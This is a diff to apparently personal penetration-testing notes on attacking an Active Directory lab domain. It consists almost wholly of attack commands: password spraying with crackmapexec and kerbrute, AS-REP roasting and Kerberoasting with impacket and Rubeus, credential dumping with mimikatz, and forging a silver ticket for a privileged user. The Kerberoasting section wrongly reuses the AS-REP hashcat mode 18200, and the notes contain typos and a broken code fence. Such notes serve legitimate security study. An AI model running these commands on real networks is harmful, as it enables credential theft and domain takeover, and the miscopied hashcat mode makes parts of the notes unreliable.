@@ -73,8 +73,48 @@ Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -e
 ```
 
 ##### PasswdAttack
+###### Passwd Spray
 ```
 crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
 
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+```
+###### PAS-REQ reoasting  
+//Target users with  Kerberos preauthentication unabled
+```
+Method1: from Linux
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+
+
+Method2: with a user we have, in target Win host
+.\Rubeus.exe asreproast /nowrap
+
+Got the hash of THe user, use hashcat crack it, normally -m 18200
+```
+###### Kerberosting
+// request TGS of a SPN/service from KDC, and crack the hash get the service
+Method1: from Linux
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+
+
+Method2: with a user we have, in target Win host
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+Got the hash of THe user, use hashcat crack it, normally -m 18200
+```
+###### Silver Ticket
+```
+//What we need: target SPN password hash, owned Domain SID
+
+whoami /user      //get SID
+
+mimikatz # privilege::debug
+
+mimikatz # sekurlsa::logonpasswords  //get the SPN hash
+
+//create ticket, forge the ticket as target user like jeffadmin 
+mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+//check whetehr the ticket is loaded in ram
+PS C:\Tools> klist
 ```
